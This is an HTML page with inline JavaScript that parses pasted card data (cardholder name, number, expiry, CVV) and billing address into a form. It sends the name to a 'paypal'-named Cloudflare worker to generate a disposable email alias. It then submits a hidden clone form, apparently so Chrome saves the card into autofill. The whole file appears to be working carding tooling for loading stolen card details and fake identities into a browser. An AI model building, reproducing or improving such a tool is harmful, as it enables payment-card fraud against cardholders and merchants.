<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const textarea = document.getElementById('textarea');
      const form = document.getElementById('full-form');
      const shadowForm = document.getElementById('shadow-form');

      const ccNameInput = form.querySelector('[name="cc-name"]');
      const nameInput = form.querySelector('[name="name"]');
      const emailInput = form.querySelector('[name="email"]');

      function duplicateCCNameIfOneWord() {
        const ccNameValue = ccNameInput.value.trim();
        const words = ccNameValue.split(/\s+/);
        if (words.length === 1 && ccNameValue.length > 0) {
          ccNameInput.value = `${ccNameValue} ${ccNameValue}`;
        }
      }

      function removeSpecialChars(text) {
        return text.replace(/[^a-zA-Z0-9\s]/g, '');
      }

      async function generateEmailViaCloudflare() {
        const clean = removeSpecialChars(nameInput.value).replace(/\s+/g, '');
        emailInput.value = "generating...";

        try {
          const response = await fetch("https://paypal21939.ottoberserk.workers.dev/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ firstName: clean, lastName: "" })
          });
          const data = await response.json();
          if (data.alias) {
            emailInput.value = data.alias;
          } else {
            emailInput.value = "";
          }
        } catch (err) {
          emailInput.value = "";
        }
      }

      textarea.addEventListener('paste', async (event) => {
        event.preventDefault();

        const pastedData = (event.clipboardData || window.clipboardData).getData('text');
        textarea.value = pastedData;

        const data = {};
        const lines = pastedData.split(/[\n,]+/);

        lines.forEach(line => {
          const match = line.match(/["']?([^"':]+)["']?\s*:\s*["']?([^"']+)["']?/);
          if (match) {
            const key = match[1].trim();
            const value = match[2].trim();
            data[key] = value;
          }
        });

        for (const [key, value] of Object.entries(data)) {
          const inputs = document.querySelectorAll(`[name="${key}"]`);
          inputs.forEach(input => {
            input.value = key === 'postal-code' ? value.toUpperCase() : value;
          });

          if (key === 'cc-name') {
            ccNameInput.value = value.trim();
            duplicateCCNameIfOneWord();
            nameInput.value = value.trim();
            await generateEmailViaCloudflare();
          }
        }
      });

      form.addEventListener('submit', function (event) {
        event.preventDefault();
        // Copy visible form values to shadow form
        const formElements = form.elements;
        const shadowElements = shadowForm.elements;
        for (let i = 0; i < formElements.length; i++) {
          if (formElements[i].name) {
            const match = shadowForm.querySelector(`[name="${formElements[i].name}"]`);
            if (match) match.value = formElements[i].value;
          }
        }

        // Request submit to trigger Chrome autofill logic, then go back
        shadowForm.requestSubmit();
        setTimeout(() => {
          window.history.back();
        }, 500);
      });
    });
  </script>
</head>
<body>
  <textarea id="textarea" placeholder="Paste or type JSON-like text here..." rows="3" cols="50" autofocus></textarea><br><br>

  <form id="full-form">
    <fieldset>
      <input type="text" name="cc-name" autocomplete="cc-name" placeholder="cc-name" required><br><br>
      <input type="text" name="cc-number" autocomplete="cc-number" placeholder="cc-number" required><br><br>
      <input type="text" name="cc-exp" autocomplete="cc-exp" placeholder="cc-exp" required><br><br>
      <input type="text" name="cc-csc" autocomplete="cc-csc" placeholder="cc-csc" required><br><br>
      <input type="text" name="name" autocomplete="name" placeholder="name" required><br><br>
      <input type="text" name="country" autocomplete="country" placeholder="country"><br><br>
      <input type="text" name="street-address" autocomplete="street-address" placeholder="street-address" required><br><br>
      <input type="text" name="address-level1" autocomplete="address-level1" placeholder="address-level1" required><br><br>
      <input type="text" name="address-level2" autocomplete="address-level2" placeholder="address-level2" required><br><br>
      <input type="text" name="postal-code" autocomplete="postal-code" placeholder="postal-code" required><br><br>
      <input type="email" name="email" autocomplete="email" placeholder="email" required><br><br>
      <button type="submit">Submit All</button>
    </fieldset>
  </form>

  <!-- Hidden clone form for triggering Chrome autofill detection -->
  <form id="shadow-form" action="" method="GET" style="display:none">
    <input type="text" name="cc-name" autocomplete="cc-name">
    <input type="text" name="cc-number" autocomplete="cc-number">
    <input type="text" name="cc-exp" autocomplete="cc-exp">
    <input type="text" name="cc-csc" autocomplete="cc-csc">
    <input type="text" name="name" autocomplete="name">
    <input type="text" name="country" autocomplete="country">
    <input type="text" name="street-address" autocomplete="street-address">
    <input type="text" name="address-level1" autocomplete="address-level1">
    <input type="text" name="address-level2" autocomplete="address-level2">
    <input type="text" name="postal-code" autocomplete="postal-code">
    <input type="email" name="email" autocomplete="email">
  </form>
</body>
</html>
